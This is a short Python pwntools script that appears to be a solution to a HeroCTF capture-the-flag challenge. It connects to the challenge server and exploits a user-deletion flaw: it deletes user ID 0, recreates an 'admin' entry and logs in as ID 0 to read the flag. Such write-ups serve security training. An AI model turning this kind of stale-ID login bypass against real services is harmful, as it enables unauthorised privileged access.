from pwn import *

r = remote("pwn.heroctf.fr", 8002)
# r = process("./Login")

r.sendlineafter(b"choice: ", b"1")
r.sendlineafter(b"[+] Username: ", b"yolo")

r.sendlineafter(b"choice: ", b"2")
r.sendlineafter(b"[+] User ID to delete: ", b"0")

r.sendlineafter(b"choice: ", b"1")
r.sendlineafter(b"[+] Username: ", b"admin")

r.sendlineafter(b"choice: ", b"3")
r.sendlineafter(b"[+] User ID to login with: ", b"0")

flag = r.recvall(timeout=1).decode().split('\n')[1]
print(f"[+] Flag: {flag}")